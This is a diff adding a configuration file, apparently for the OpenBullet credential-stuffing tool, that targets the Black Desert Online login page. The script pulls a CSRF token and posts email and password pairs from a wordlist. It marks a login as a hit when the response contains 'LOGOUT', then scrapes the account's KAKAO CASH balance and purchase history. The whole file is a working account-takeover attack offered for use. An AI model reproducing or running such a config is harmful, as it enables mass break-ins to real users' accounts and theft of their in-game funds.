@@ -1,0 +1,72 @@
+[SETTINGS]
+{
+  "Name": "BlackDesertOnline",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-16T10:46:14.8764001+02:00",
+  "AdditionalInfo": "",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "isWtoEdit": false,
+  "Author": "Acemy#7578",
+  "Version": "1.2.1.2",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.blackdesertonline.com/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: www.blackdesertonline.com" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+
+PARSE "<SOURCE>" LR "csrf\" value=\"" "\">" -> VAR "CSRF" 
+
+REQUEST POST "https://www.blackdesertonline.com/login" 
+  CONTENT "accessToken=&socialId=&socialType=&tsvToken=&password_more=&restoreKey=&returnUrl=%252F%253Fre%253Dlogin&ept=&_csrf=<CSRF>&email=<USER>&password=<PASS>&rememberEmail=on" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: www.blackdesertonline.com" 
+  HEADER "Origin: https://www.blackdesertonline.com" 
+  HEADER "Referer: https://www.blackdesertonline.com/login" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "LOGOUT" 
+  KEYCHAIN Failure OR 
+    KEY "User cancelled login or did not fully" 
+
+REQUEST GET "https://www.blackdesertonline.com/myinfo/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "Host: www.blackdesertonline.com" 
+  HEADER "Referer: https://www.blackdesertonline.com/?re=login" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+
+PARSE "<SOURCE>" LR "class=\"tit_item\"><span class=\"txt_num\">" "</span>" Recursive=TRUE -> CAP "KAKAO CASH HISTORY" 
+
+PARSE "<SOURCE>" LR "<dt>KAKAO CASH</dt>" "</span> Cash</dd>" -> VAR "KAKAO" 
+
+FUNCTION Replace "<dd><span class=\"txt_num\">" " " "<KAKAO>" -> CAP "KAKAO CASH" 
+
